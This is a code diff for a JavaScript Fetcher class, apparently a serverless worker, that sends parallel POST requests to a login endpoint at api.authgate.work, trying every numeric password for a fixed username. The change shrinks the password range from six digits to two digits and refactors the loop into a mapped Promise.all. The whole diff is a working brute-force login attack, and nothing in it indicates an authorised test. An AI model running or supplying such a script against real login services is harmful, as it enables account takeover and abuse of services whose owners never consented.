@@ -29,17 +29,16 @@ export class Fetcher {
 	}
 
 	async fetch(request) {
-		// Generate and try all six-digit number permutations as passwords
+		// Generate and try all two-digit number permutations as passwords
 		const targetUrl = 'https://api.authgate.work/login';
-		const passwords = generateSixDigitNumberPermutations();
-		const promises = [];
+		const passwords = generateTwoDigitNumberPermutations();
 
-		for (const password of passwords) {
+		const promises = passwords.map((password) => {
 			const formData = new FormData();
 			formData.append('username', 'test@test.com'); // Username is known
 			formData.append('password', password);
 
-			let promise = fetch(targetUrl, {
+			return fetch(targetUrl, {
 				method: 'POST',
 				body: formData,
 			}).then((response) => {
@@ -51,20 +50,18 @@ export class Fetcher {
 					console.log('Failed login.');
 				}
 			});
-
-			promises.push(promise);
-		}
+		});
 
 		await Promise.all(promises);
 
-		return new Response('Login attempts with all six-digit number permutations completed.', { status: 200 });
+		return new Response('Login attempts with all two-digit number permutations completed.', { status: 200 });
 	}
 }
 
-function generateSixDigitNumberPermutations() {
+function generateTwoDigitNumberPermutations() {
 	const passwords = [];
-	for (let i = 0; i < 1000000; i++) {
-		const password = i.toString().padStart(6, '0');
+	for (let i = 0; i < 100; i++) {
+		const password = i.toString().padStart(2, '0');
 		passwords.push(password);
 	}
 	return passwords;
